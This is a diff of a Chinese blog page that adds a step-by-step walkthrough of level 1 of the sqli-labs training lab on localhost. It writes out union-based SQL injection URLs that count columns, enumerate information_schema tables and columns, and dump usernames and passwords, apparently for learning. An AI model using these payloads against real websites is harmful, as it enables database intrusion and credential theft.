@@ -6,22 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Summer&#39;s Blog</title>
+  <title>sqli-labs通关详解 | Summer&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="##标题 啦啦啦那些年  啦啦啦  受到刺激可能打开 *‘’‘’ 啦啦啦啦 别的花草笔记本 aiiqng">
-<meta name="keywords" content="python,java,javaweb,html,css,php">
+  <meta name="description" content="前言很开心自己可以再次的学习sql注入，自己总是嘴上说写，但是也没实际的付出行动，导致了现在弄啥都有点懵，现在发现对待任何一件事情都要认真，不要半途就放弃了。当你要重拾它的时候，就需要付出很多的时间，还有不要相信自己的记忆力，一定要做记录！ sql注入的知识点：先判断哪里存在注入，注入的类型是，然后就判断有几列，找到可以回显的点，进一步的判断数据库名，表名，和表中的数据。">
+<meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Summer&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/2019/04/24/啦啦啦/index.html">
+<meta property="og:title" content="sqli-labs通关详解">
+<meta property="og:url" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/index.html">
 <meta property="og:site_name" content="Summer&#39;s Blog">
-<meta property="og:description" content="##标题 啦啦啦那些年  啦啦啦  受到刺激可能打开 *‘’‘’ 啦啦啦啦 别的花草笔记本 aiiqng">
+<meta property="og:description" content="前言很开心自己可以再次的学习sql注入，自己总是嘴上说写，但是也没实际的付出行动，导致了现在弄啥都有点懵，现在发现对待任何一件事情都要认真，不要半途就放弃了。当你要重拾它的时候，就需要付出很多的时间，还有不要相信自己的记忆力，一定要做记录！ sql注入的知识点：先判断哪里存在注入，注入的类型是，然后就判断有几列，找到可以回显的点，进一步的判断数据库名，表名，和表中的数据。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://github.com/carmen-zhy/job/blob/master/image/1.png">
-<meta property="og:updated_time" content="2019-04-24T08:36:12.310Z">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/title·.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/11.png">
+<meta property="og:updated_time" content="2019-06-03T16:01:52.485Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Summer&#39;s Blog">
-<meta name="twitter:description" content="##标题 啦啦啦那些年  啦啦啦  受到刺激可能打开 *‘’‘’ 啦啦啦啦 别的花草笔记本 aiiqng">
-<meta name="twitter:image" content="https://github.com/carmen-zhy/job/blob/master/image/1.png">
+<meta name="twitter:title" content="sqli-labs通关详解">
+<meta name="twitter:description" content="前言很开心自己可以再次的学习sql注入，自己总是嘴上说写，但是也没实际的付出行动，导致了现在弄啥都有点懵，现在发现对待任何一件事情都要认真，不要半途就放弃了。当你要重拾它的时候，就需要付出很多的时间，还有不要相信自己的记忆力，一定要做记录！ sql注入的知识点：先判断哪里存在注入，注入的类型是，然后就判断有几列，找到可以回显的点，进一步的判断数据库名，表名，和表中的数据。">
+<meta name="twitter:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/title·.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Summer&#39;s Blog" type="application/atom+xml">
   
@@ -174,21 +185,64 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-啦啦啦" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sqli-labs通关详解" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli-labs通关详解
+    </h1>
+  
+
+        
+        <a href="/2019/06/03/sqli-labs通关详解/" class="archive-article-date">
+  	<time datetime="2019-06-03T14:51:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-03</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##标题</p>
-<h1 id="啦啦啦"><a href="#啦啦啦" class="headerlink" title="啦啦啦"></a>啦啦啦</h1><p>那些年</p>
-<hr>
-<p><strong>啦啦啦</strong></p>
-<p><img src="https://github.com/carmen-zhy/job/blob/master/image/1.png" alt></p>
-<p><u>受到刺激可能打开</u></p>
-<p>*<em>‘’‘’</em></p>
-<p><del>啦啦啦啦</del></p>
-<p><a href="www.baidu.com">别的花草笔记本</a></p>
-<h2 id="aiiqng"><a href="#aiiqng" class="headerlink" title="aiiqng"></a>aiiqng</h2>
+        <p><img src="/2019/06/03/sqli-labs通关详解/title·.jpg" alt></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很开心自己可以再次的学习sql注入，自己总是嘴上说写，但是也没实际的付出行动，导致了现在弄啥都有点懵，现在发现对待任何一件事情都要认真，不要半途就放弃了。当你要重拾它的时候，就需要付出很多的时间，还有不要相信自己的记忆力，一定要做记录！</p>
+<h2 id="sql注入的知识点："><a href="#sql注入的知识点：" class="headerlink" title="sql注入的知识点："></a>sql注入的知识点：</h2><p>先判断哪里存在注入，注入的类型是，然后就判断有几列，找到可以回显的点，进一步的判断数据库名，表名，和表中的数据。</p>
+<a id="more"></a>
+<h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><p>打开输入?id=1,发现是这个样子</p>
+<p><img src="/2019/06/03/sqli-labs通关详解/1.png" alt></p>
+<p>判断注入的类型，闭合sql语句，找到正确的注入类型会报错，但是加上sql的注释就会恢复</p>
+<p><img src="/2019/06/03/sqli-labs通关详解/2.png" alt></p>
+<p><img src="/2019/06/03/sqli-labs通关详解/3.png" alt></p>
+<p>发现是单引号注入，判断有几列，一般用二分法来判断，order  by 加上你猜测的数字，经过判断发现有3列</p>
+<blockquote>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> order by   3 –+</p>
+</blockquote>
+<p><img src="/2019/06/03/sqli-labs通关详解/4.png" alt></p>
+<p>然后判断回显的点用,2和3可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/</span><br><span class="line">?id=-1&apos; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/03/sqli-labs通关详解/5.png" alt></p>
+<p>接下来判断数据库名，数据库版本，和使用者，先介绍一下concat(),连接字符串，concat_ws(),加一个符号用于分割数据，group_concat</p>
+<p><img src="/2019/06/03/sqli-labs通关详解/7.png" alt></p>
+<p><img src="/2019/06/03/sqli-labs通关详解/6.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/</span><br><span class="line">?id=-1&apos; union select 1,2,concat_ws(char(32,32),database(),version(),user()) --+</span><br></pre></td></tr></table></figure>
+<p>user():返回当前数据库连接使用的用户</p>
+<p>database():返回当前数据库连接使用的数据库</p>
+<p>version():返回当前数据库的版本<img src="/2019/06/03/sqli-labs通关详解/8.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/</span><br><span class="line">?id=-1&apos; union select 1,2,concat_ws(char(32,32),database(), --+</span><br></pre></td></tr></table></figure>
+<p>开始查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&apos; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</span><br></pre></td></tr></table></figure>
+<p>这时我们就要用的limit了， 第一个参数是结果集中的第几个，跟C语言的数组的索引一致，第二个参数就是个数</p>
+<p>如 limit  1,2  :返回第二行和第三行，因为1表示是第二行，2表示行数是2</p>
+<p><img src="/2019/06/03/sqli-labs通关详解/9.png" alt></p>
+<p>不停的改变limit的第一个参数，得到4张表，分别是 emails,referers,uagents,users,对我们有用的是 users这张表。查看表中的列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&apos; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 1,1 --+</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/03/sqli-labs通关详解/10.png" alt></p>
+<p>不停的改变limit的第一个参数，得到3列，分别是 id,username,password现在就可以去获取数据了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&apos; union select 1,2,concat_ws(char(32,32,32),id,username,password) from users limit 0,1 --+</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/03/sqli-labs通关详解/11.png" alt></p>
+<p>不停的改变limit的第一个参数，就可以查看数据了</p>
+
       
 
       
@@ -227,7 +281,29 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/web//" class="article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
 
@@ -277,7 +353,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/24/啦啦啦/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/06/03/sqli-labs通关详解/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -291,18 +367,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/04/24/test/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          test
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/04/21/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2019/04/29/web安全/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">web安全</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -329,7 +396,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#啦啦啦"><span class="toc-number">1.</span> <span class="toc-text">啦啦啦</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#aiiqng"><span class="toc-number">1.1.</span> <span class="toc-text">aiiqng</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入的知识点："><span class="toc-number">1.1.</span> <span class="toc-text">sql注入的知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一关："><span class="toc-number">1.1.1.</span> <span class="toc-text">第一关：</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
